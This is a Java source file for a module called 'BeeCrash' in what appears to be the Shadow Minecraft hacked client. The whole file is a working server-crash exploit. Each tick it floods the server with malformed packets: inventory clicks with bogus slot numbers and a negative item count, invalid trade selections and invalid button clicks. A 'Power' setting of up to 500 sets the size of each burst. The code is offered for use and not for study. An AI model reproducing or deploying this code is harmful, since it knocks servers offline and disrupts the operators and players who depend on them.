/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ButtonClickC2SPacket;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.SelectMerchantTradeC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.shadow.client.feature.config.DoubleSetting;
import net.shadow.client.feature.config.EnumSetting;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;
import net.shadow.client.helper.event.EventListener;
import net.shadow.client.helper.event.EventType;
import net.shadow.client.helper.event.events.PacketEvent;


public class ErrorCrash extends Module {

    final EnumSetting<Mode> mode = this.config.create(new EnumSetting.Builder<>(Mode.Click).name("Mode").description("what bad packet to send").get());
    final DoubleSetting pwr = this.config.create(new DoubleSetting.Builder(5).min(1).max(500).name("Power").description("Force to attack with").get());

    public ErrorCrash() {
        super("BeeCrash", "Bee crash yours truly. :)", ModuleType.CRASH);
    }

    @EventListener(type=EventType.PACKET_SEND)
    void real(PacketEvent event){
        if(event.getPacket() instanceof PlayerMoveC2SPacket packet){
            event.setCancelled(true);
        }
    }

    @Override
    public void tick() {
        switch (mode.getValue()) {
            case Click -> {
                Int2ObjectMap<ItemStack> ripbozo = new Int2ObjectArrayMap<>();
                ripbozo.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
                for (int i = 0; i < pwr.getValue(); i++) {
                    client.player.networkHandler.sendPacket(
                        new ClickSlotC2SPacket(
                            client.player.currentScreenHandler.syncId, 
                            123344, 
                            2957234, 
                            2859623, 
                            SlotActionType.PICKUP, 
                            new ItemStack(Items.AIR, -1), 
                            ripbozo
                        )
                    );
                }
            }

            case Trade -> {
                for (int i = 0; i < pwr.getValue(); i++) {
                    client.player.networkHandler.sendPacket(new SelectMerchantTradeC2SPacket(-1));
                }
            }

            case Button -> {
                for (int i = 0; i < pwr.getValue(); i++) {
                    client.player.networkHandler.sendPacket(new ButtonClickC2SPacket(client.player.currentScreenHandler.syncId, -1));
                }
            }
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }


    public enum Mode {
        Click, Trade, Button
    }
}
